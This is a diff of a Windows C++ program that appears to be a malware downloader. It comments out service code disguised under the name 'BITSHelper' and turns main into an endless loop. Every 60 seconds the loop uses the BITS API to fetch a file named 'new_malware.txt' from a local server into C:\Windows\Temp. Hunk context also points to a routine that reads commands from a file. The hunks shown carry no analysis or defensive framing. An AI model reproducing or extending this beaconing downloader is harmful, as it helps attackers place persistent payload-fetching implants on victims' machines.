@@ -8,20 +8,20 @@
 
 #pragma comment(lib, "Bits.lib")
 
-SERVICE_STATUS ServiceStatus;
-SERVICE_STATUS_HANDLE hStatusHandle;
-
-void WINAPI ServiceCtrlHandler(DWORD ctrlCode)
-{
-    switch (ctrlCode) {
-    case SERVICE_CONTROL_STOP:
-        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
-        SetServiceStatus(hStatusHandle, &ServiceStatus);
-        break;
-    default:
-        break;
-    }
-}
+//SERVICE_STATUS ServiceStatus;
+//SERVICE_STATUS_HANDLE hStatusHandle;
+//
+//void WINAPI ServiceCtrlHandler(DWORD ctrlCode)
+//{
+//    switch (ctrlCode) {
+//    case SERVICE_CONTROL_STOP:
+//        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+//        SetServiceStatus(hStatusHandle, &ServiceStatus);
+//        break;
+//    default:
+//        break;
+//    }
+//}
 
 // Read a command from the file
 std::wstring readCommentFromFile(const std::wstring& filePath) {
@@ -150,37 +150,37 @@ void DownloadFile(const std::wstring& remoteUrl, const std::wstring& localFile) 
     pBitsManager->Release();
 }
 
-void WINAPI ServiceMain(DWORD argc, LPSTR* argv)
-{
-    hStatusHandle = RegisterServiceCtrlHandler(L"BITSHelper", ServiceCtrlHandler);
-    if (hStatusHandle == NULL) {
-        return;
-    }
+//void WINAPI ServiceMain(DWORD argc, LPSTR* argv)
+//{
+//    hStatusHandle = RegisterServiceCtrlHandler(L"BITSHelper", ServiceCtrlHandler);
+//    if (hStatusHandle == NULL) {
+//        return;
+//    }
+//
+//    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+//    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+//    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
+//    SetServiceStatus(hStatusHandle, &ServiceStatus);
+//
+//    // Start your executable logic here
+//    
+//}
 
-    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
-    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
-    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
-    SetServiceStatus(hStatusHandle, &ServiceStatus);
+int main() {
+    
+    /*SERVICE_TABLE_ENTRY ServiceTable[] = {
+        { const_cast<LPWSTR>(L"BITSHelper"), (LPSERVICE_MAIN_FUNCTION)ServiceMain },
+        { NULL, NULL }
+    };
 
-    // Start your executable logic here
-    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
-        std::wstring remoteUrl = L"http://localhost:8080/updates/c7d5fbc1-2f27-4f0b-b1bd-0c6dae457414.cgv";  // Replace with your file URL
+    StartServiceCtrlDispatcher(ServiceTable);
+    return 0;*/
+    while (true) {
+        std::wstring remoteUrl = L"http://localhost:8080/updates/new_malware.txt";  // Replace with your file URL
         std::wstring localFile = L"C:\\Windows\\Temp\\c7d5fbc1-2f27-4f0b-b1bd-0c6dae457414.cgv";  // Replace with your target path
         CoInitialize(nullptr);
         DownloadFile(remoteUrl, localFile);
         CoUninitialize();
         Sleep(60000);
     }
-}
-
-int main() {
-    
-    SERVICE_TABLE_ENTRY ServiceTable[] = {
-        { const_cast<LPWSTR>(L"BITSHelper"), (LPSERVICE_MAIN_FUNCTION)ServiceMain },
-        { NULL, NULL }
-    };
-
-    StartServiceCtrlDispatcher(ServiceTable);
-    return 0;
-
 }
